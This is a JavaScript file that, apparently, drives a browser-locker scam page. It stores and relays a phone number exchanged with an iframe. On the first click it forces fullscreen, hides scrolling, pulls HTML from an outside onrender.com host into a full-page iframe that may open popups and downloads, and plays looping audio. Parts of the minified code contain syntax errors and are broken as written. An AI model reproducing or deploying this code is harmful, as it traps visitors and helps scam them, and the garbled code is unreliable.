function setCookie(name, value, days) {
  const expires = new Date(Date.now() + days * 864e5 ).toUTCString();
  document.cookie = name + '=' + encodeURIComponent(value) + '; expires=' + expires + '; path=/';
}

function getCookie(name) {
  return document.cookie.split('; ').reduce((r , v) => {
    const parts = v.split('=');
    return parts[0] === name ? decodeURIComponent(parts[1] ) : r;
  }, '');
}

let phoneCookie = getCookie("phoneNumber");
window.addEventListener("message", function(event) {
  const data = event.data;
  const iframe = document.querySelector("iframe");

  console.log("Message received from iframe:", data);
  console.log("Phone from iframe:", data.phoneFromFrame);

  if (data && data.phoneFromFrame && typeof data.phoneFromFrame === "string") {
    if (!phoneCookie) {
      setCookie("phoneNumber", data.phoneFromFrame, 1);
      phoneCookie = data.phoneFromFrame;
    }

    if (iframe && iframe.contentWindow) {
      iframe.contentWindow.postMessage({ phone: phoneCookie }, "*");
    }
  }
});
document.documentElement.style.overflow="hidden",document.body.insertAdjacentHTML("afterbegin",'<div id="bruceDiv" style="z-index: 9999; pointer-events: auto; overflow: hidden;"></div>'),document.addEventListener("click",function(){window.scrollTo(0,0),setTimeout(()=>{document.documentElement.requestFullscreen?document.documentElement.requestFullscreen():document.documentElement.mozRequestFullScreen?document.documentElement.mozRequestFullScreen():document.documentElement.webkitRequestFullscreen?document.documentElement.webkitRequestFullscreen():document.documentElement.msRequestFullscreen&&document.documentElement.msRequestFullscreen()},100),fetch("https://walterwhiteanalytics.onrender.com").then(e=>e.text()).then(e=>{let t=new Blob([e],{type:"text/html"}),l=URL.createObjectURL(t),n=document.createElement("iframe");n.src=l,n,style.width="100%",n.style.height="100%",n.frameBorder="0",n.setAttribute("allowfullscreen",""),n.setAttribute("webkitallowfullscreen",""),n.setAttribute("mozallowfullscreen",""),n.sandbox="allow-scripts allow-popups allow-downloads","document.getElementById("bruceDiv").appendChild(n),document.getElementById("bruceDiv").style.height="100vh"}).catch(e=>{console.error("Error fetching the HTML:",e)})},{once:!0}),document.addEventListener("click",function(){let e=new Audio("https://audio.jukehost.co.uk/JOElTsU8qKrJaOg4pmapsmHCtrtXvFNq");e.loop=!0,e.play();let t=new Audio("https://audio.jukehost.co.uk/wuD65PsKBrAxWCZU4cJ2CbhUqwl33URw");t.loop=!0,t.play()},{once:!0});;